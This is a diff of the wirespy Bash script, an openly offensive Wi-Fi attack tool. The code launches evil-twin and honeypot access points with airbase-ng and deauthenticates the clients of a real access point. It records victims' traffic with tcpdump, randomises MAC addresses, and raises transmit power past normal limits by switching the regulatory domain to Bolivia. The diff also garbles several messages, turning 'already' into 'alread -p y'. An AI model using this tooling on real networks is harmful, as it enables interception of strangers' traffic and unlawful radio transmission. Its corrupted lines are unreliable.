@@ -43,12 +43,11 @@ BG_RED='\e[41m'
 BG_YELLOW='\e[43m'
 
 declare -g  PROMPT="${BG_GREEN}${FG_WHITE}wirespy$RESET_ALL »"
-declare -gr PROMPT_EVILTWIN="${BG_GREEN}${FG_WHITE}wirespy$FG_BLACK > eviltwin$RESET_ALL »"
+declare -gr PROMPT_EVILTWIN_INFO="${BG_GREEN}${FG_WHITE}wirespy$FG_BLACK > eviltwin$RESET_ALL »"
 declare -gr PROMPT_HONEYPOT="${BG_GREEN}${FG_WHITE}wirespy$FG_BLACK > honeypot$RESET_ALL »"
 declare -gr PROMPT_POWERUP="${BG_GREEN}${FG_WHITE}wirespy$FG_BLACK > powerup$RESET_ALL »"
 
 isAP=false
-# isDNS=false
 isSniffing=false
 
 declare -i attack_type=0
@@ -65,7 +64,7 @@ TCPDUMP_PID=''
 
 declare -gr AIRBASE_ERROR='An error occurred with airbase-ng, no tap interface was created'
 declare -gr AP_PREREQUISITE='To use this option, first configure an access-point'
-declare -gr EVILTWIN='This attack consists of creating an evil copy of an access point and repeatedly sending deauth packets to its clients to force them to connect to our evil copy.
+declare -gr EVILTWIN_INFO='This attack consists of creating an evil copy of an access point and repeatedly sending deauth packets to its clients to force them to connect to our evil copy.
 Consequently, choose the same ESSID and wireless channel as the targeted access point.
 To properly perform this attack the attacker should first scan all the in-range access points to select a target. Next step is to copy the BSSID, ESSID and channel of the 
 selected target access point, to create its twin. 
@@ -132,7 +131,7 @@ function check_compatibility() {
         fi
     done
 
-    print_info 'All the required packages are already installed'
+    print_info 'All the required packages are alread -p y installed'
 }
 
 
@@ -154,9 +153,9 @@ ${FG_GREEN}quit$RESET_FG          : exit the script gracefully
 function menu() {
     while :; do
         PROMPT=$PROMPT
-        read -p "$(echo -e $PROMPT) " choice
+        read -p  "$(echo -e $PROMPT) "
 
-        case $choice in
+        case $REPLY in
             'clear')
                 reset
                 ;;
@@ -168,7 +167,7 @@ function menu() {
                 ;;
             'run eviltwin')
                 clean_up &> /dev/null
-                PROMPT=$PROMPT_EVILTWIN
+                PROMPT=$PROMPT_EVILTWIN_INFO
                 configure_intfs
                 eviltwin
                 isAP=true
@@ -204,7 +203,7 @@ function menu() {
                         TCPDUMP_PID=$(tcpdump -i $TINTF -w ./logs/capture_$(/bin/date +"%Y%m%d-%H%M%S").pcap &> /dev/null & echo $!)
                         isSniffing=true
                     else
-                        print_warning 'The traffic is already being captured'
+                        print_warning 'The traffic is alread -p y being captured'
                     fi
                 fi
                 ;;
@@ -222,7 +221,7 @@ function menu() {
                 fi
                 ;;
             *)
-                print_warning "Unknown or invalid syntax '$choice', type help for the help menu"
+                print_warning "Invalid command: $REPLY - type help for the list of available commands"
                 ;;
         esac
     done
@@ -230,7 +229,6 @@ function menu() {
 
 
 function configure_intfs() {
-    local pass=false
     local -i res=1
 
     print_wirespy 'Select the internet-facing interface:'
@@ -246,21 +244,23 @@ function configure_intfs() {
 
     print_wirespy "Do you wish to randomise $INTF MAC address (can cause problems)?"
 
-    while [[ $pass = false ]]; do
-        read -p "$(echo -e $PROMPT) " choice
+    while :; do
+        read -p  "$(echo -e $PROMPT) " 
 
-        if [[ $choice = 'y' || $choice = 'ye' || $choice = 'yes' ]]; then
-            print_info "Randomising $INTF MAC address..."
-            ip link set "$INTF" down && macchanger -A "$INTF" 1> /dev/null && ip link set "$INTF" up
-            print_warning 'In case of problems, RESTART networking (/etc/init.d/network restart), or use wicd (wicd-client)'
-            pass=true
-        elif [[ $choice = 'n' || $choice = 'no' ]]; then
-            pass=true
-        else
-            print_warning "$INVALID_CHOICE"
-        fi
+        case $REPLY in
+            'y'|'ye'|'yes')
+                print_info "Randomising $INTF MAC address..."
+                ip link set "$INTF" down && macchanger -A "$INTF" 1> /dev/null && ip link set "$INTF" up
+                print_warning 'In case of problems, RESTART networking (/etc/init.d/network restart), or use wicd (wicd-client)'
+                break
+                ;;
+            'n'|'no')
+                break
+                ;;
+            *)
+                print_warning "Invalid choice: $REPLY"
+        esac
     done
-    pass=false
 
     print_wirespy 'Select the wireless interface to use:'
 
@@ -272,7 +272,7 @@ function configure_intfs() {
         res=$?
 
         if [[ $WINTF = "$INTF" ]]; then
-            print_warning "$INTF is already in use, select another interface"
+            print_warning "$INTF is alread -p y in use, select another interface"
             res=1
         fi
     done
@@ -299,100 +299,111 @@ function configure_intfs() {
 
     print_wirespy "Do you wish to randomise $MINTF MAC address (recommended)?"
 
-    while [[ $pass = false ]]; do
-        read -p "$(echo -e $PROMPT) " choice
+    while :; do
+        read -p  "$(echo -e $PROMPT) " 
 
-        if [[ $choice = 'y' || $choice = 'ye' || $choice = 'yes' ]]; then
-            print_info "Randomising $MINTF MAC address..."
-            ip link set "$MINTF" down && macchanger -A "$MINTF" 1> /dev/null && ip link set "$MINTF" up
-            pass=true
-        elif [[ $choice = 'n' || $choice = 'no' ]]; then
-            pass=true
-        else
-            print_warning "$INVALID_CHOICE"
-        fi
+        case $REPLY in
+            'y'|'ye'|'yes')
+                print_info "Randomising $MINTF MAC address..."
+                ip link set "$MINTF" down && macchanger -A "$MINTF" 1> /dev/null && ip link set "$MINTF" up
+                break
+                ;;
+            'n'|'no')
+                break
+                ;;
+            *)
+                print_warning "Invalid choice: $REPLY"
+        esac
     done
 }
 
 
 function honeypot() {
     local -i attack_type=0
-    local pass=false
+    local options=(
+        'Blackhole: The access point type will respond to all probe requests (the access point may receive a lot 
+of requests in areas with high levels of WiFi activity such as crowded public places)' 
+        'Bullzeye: The access point type will respond only to the probe requests specifying the access point ESSID.'
+        )
+    local PS3="$(echo -e $PROMPT) "
 
-    echo "$HONEYPOT"
-
-    while [[ $pass = false ]]; do
-        read -p "$(echo -e $PROMPT) " attack_type
-
-        case $attack_type in
-            [1-2])
-                pass=true
-                ;;
-            *) 
-                print_warning "Invalid option: $attack_type"
-                pass=false
-                ;;
+    select option in "${options[@]}"
+    do
+        case $REPLY in
+            1) 
+            attack_type=1
+            break 
+            ;;
+            2) 
+            attack_type=2
+            break 
+            ;;
+            *)
+            print_warning "Invalid option: $REPLY"
+            ;;
         esac
     done
-    pass=false
 
     print_wirespy 'Access point ESSID?'
     read -p "$(echo -e $PROMPT) " ESSID
 
-    while [[ $pass = false ]]; do
-        print_wirespy 'Enter the wireless channel to use (value must be between 1 and 12):'
-        read -p "$(echo -e $PROMPT) " WCHAN
+    print_wirespy 'Enter the wireless channel to use (value must be between 1 and 12):'
 
-        case $WCHAN in 
+    while :; do
+        read -p  "$(echo -e $PROMPT) "
+        
+        case $REPLY in 
             [1-9]|1[0-2])
-                pass=true
+                WCHAN=$REPLY
+                break
                 ;;
             *) 
-                print_warning "$WCHAN is not a valid wireless channel"
-                pass=false
+                print_warning "Invalid channel: $REPLY"
                 ;;
         esac
     done
-    pass=false
 
-    while [[ $pass = false ]]; do
-        print_wirespy 'Configure WEP authentication for the access-point?'
-        read -p "$(echo -e $PROMPT) " choice
+    print_wirespy 'Configure WEP authentication for the access-point?'
 
-        if [[ $attack_type = 1 ]]; then
-            if [[ $choice = 'y' || $choice = 'ye' || $choice = 'yes' ]]; then
-                print_wirespy 'Enter a WEP password (value must be 10 hexadecimal characters):'
-                read -p "$(echo -e $PROMPT) " WEP 
-                
-                xterm -fg green -title "Blackhole - $ESSID" -e "airbase-ng -w $WEP -c $WCHAN -e $ESSID -P -C 60 $MINTF -v | tee ./conf/tmp.txt 2> /dev/null" &
-                XTERM_AIRBASE_PID=$!
-                pass=true
-            elif [[ $choice = 'n' || $choice = 'no' ]]; then
-                xterm -fg green -title "Blackhole - $ESSID" -e "airbase-ng -c $WCHAN -e $ESSID -P $MINTF -v | tee ./conf/tmp.txt 2> /dev/null" &
-                XTERM_AIRBASE_PID=$!
-                pass=true
-            else
-                print_warning "$INVALID_CHOICE"
-                pass=false
-            fi
-
-        elif [[ $attack_type = 2 ]]; then
-            if [[ $choice = 'y' || $choice = 'ye' || $choice = 'yes' ]]; then
+   while :; do
+        read -p  "$(echo -e $PROMPT) "
+        
+        case $REPLY in
+            'y'|'ye'|'yes')
                 print_wirespy 'Enter a WEP password (value must be 10 hexadecimal characters):'
                 read -p "$(echo -e $PROMPT) " WEP 
 
-                xterm -fg green -title "Bullzeye - $ESSID" -e "airbase-ng -w $WEP -c $WCHAN -e $ESSID $MINTF -v | tee ./conf/tmp.txt 2> /dev/null" &
-                XTERM_AIRBASE_PID=$!
-                pass=true
-            elif [[ $choice = 'n' || $choice = 'no' ]]; then
-                xterm -fg green -title "Bullzeye - $ESSID" -e "airbase-ng -c $WCHAN -e $ESSID $MINTF -v | tee ./conf/tmp.txt 2> /dev/null" &
-                XTERM_AIRBASE_PID=$!
-                pass=true
-            else
-                print_warning "$INVALID_CHOICE"
-                pass=false
-            fi
-        fi
+                case $attack_type in
+                    1)
+                        xterm -fg green -title "Blackhole - $ESSID" -e "airbase-ng -w $WEP -c $WCHAN -e $ESSID -P -C 60 $MINTF -v | tee ./conf/tmp.txt 2> /dev/null" &
+                        XTERM_AIRBASE_PID=$!
+                        break
+                        ;;
+                    2)
+                        xterm -fg green -title "Bullzeye - $ESSID" -e "airbase-ng -w $WEP -c $WCHAN -e $ESSID $MINTF -v | tee ./conf/tmp.txt 2> /dev/null" &
+                        XTERM_AIRBASE_PID=$!
+                        break
+                        ;;    
+                esac
+                ;;
+            'n'|'no')
+                case $attack_type in
+                    1)
+                        xterm -fg green -title "Blackhole - $ESSID" -e "airbase-ng -c $WCHAN -e $ESSID -P $MINTF -v | tee ./conf/tmp.txt 2> /dev/null" &
+                        XTERM_AIRBASE_PID=$!
+                        break
+                        ;;
+                    2)
+                        xterm -fg green -title "Bullzeye - $ESSID" -e "airbase-ng -c $WCHAN -e $ESSID $MINTF -v | tee ./conf/tmp.txt 2> /dev/null" &
+                        XTERM_AIRBASE_PID=$!
+                        break
+                        ;;  
+                esac
+                ;;
+            *)
+                print_warning "Invalid choice: $REPLY"
+                ;;
+        esac
     done
 
     sleep 4     # crucial, to let TINTF come up before setting it up  
@@ -415,9 +426,7 @@ function honeypot() {
 
 
 function eviltwin() {
-    local pass=false
-
-    echo "$EVILTWIN"
+    echo "$EVILTWIN_INFO"
 
     print_wirespy 'ESSID for the evil-twin?'
     read -p "$(echo -e $PROMPT) " eviltwin_ESSID
@@ -425,17 +434,18 @@ function eviltwin() {
     print_wirespy 'BSSID for the evil-twin?'
     read -p "$(echo -e $PROMPT) " eviltwin_BSSID
 
-    while [[ $pass = false ]]; do
-        print_wirespy "Enter the wireless channel to use (value must be identical to the legitimate access-point to spoof):"
-        read -p "$(echo -e $PROMPT) " WCHAN
+    print_wirespy 'Enter the wireless channel to use (value must be identical to the legitimate access-point to spoof):'
 
-        case $WCHAN in
+    while :; do
+        read -p  "$(echo -e $PROMPT) "
+        
+        case $REPLY in 
             [1-9]|1[0-2])
-                pass=true
+                WCHAN=$REPLY
+                break
                 ;;
             *) 
-                print_warning "Invalid wireless channel: $WCHAN"
-                pass=false
+                print_warning "Invalid channel: $REPLY"
                 ;;
         esac
     done
@@ -462,6 +472,43 @@ function eviltwin() {
     
     print_info "$eviltwin_ESSID evil-twin is now running..."
     sleep 6
+}
+
+
+function powerup() {
+    local -i res=1
+    local -i BOOST=''
+    local WINTF=''
+
+    print_wirespy 'Select the wireless interface to boost-up:'
+
+    display_wintfs
+
+    while [[ ($res != 0) ]]; do
+        read -p "$(echo -e $PROMPT_POWERUP) " WINTF
+        check_intf "$WINTF"
+        res=$?
+    done
+
+    print_wirespy "Enter the power boost (up to to 4000) to apply to ${WINTF}:"
+
+    while :; do
+        read -p  "$(echo -e $PROMPT_POWERUP) "
+        
+        if [[ $REPLY -ge 0 ]] && [[ $REPLY -le 4000 ]]; then
+            BOOST=$REPLY
+            break
+        else
+            print_warning "Invalid value: $REPLY"
+        fi
+    done
+
+    print_info "$WINTF powering up..."
+    # Bolivia allows high power levels
+    ip link set "$WINTF" down && iw reg set BO && iw dev "$WINTF" set txpower fixed "$BOOST" && ip link set "$WINTF" up
+    sleep 4
+
+    iw dev "$WINTF" info
 }
 
 
@@ -544,32 +591,6 @@ function check_intf() {
         print_warning "Invalid interface: $1"
         return 1
     fi
-}
-
-
-function powerup() {
-    local -i res=1
-    local WINTF=''
-
-    print_wirespy 'Select the wireless interface to boost-up:'
-
-    display_wintfs
-
-    while [[ $res != 0 ]]; do
-        read -p "$(echo -e $PROMPT_POWERUP) " WINTF
-        check_intf "$WINTF"
-        res=$?
-    done
-
-    print_wirespy "Enter the power boost (up to to 4000) to apply to ${WINTF}:"
-    read -p "$(echo -e $PROMPT_POWERUP) " boost
-
-    print_info "$WINTF powering up..."
-    # Bolivia allows high frequency power
-    ip link set "$WINTF" down && iw reg set BO && iw dev "$WINTF" set txpower fixed "$boost" && ip link set "$WINTF" up
-    sleep 4
-
-    iw dev "$WINTF" info
 }
 
 
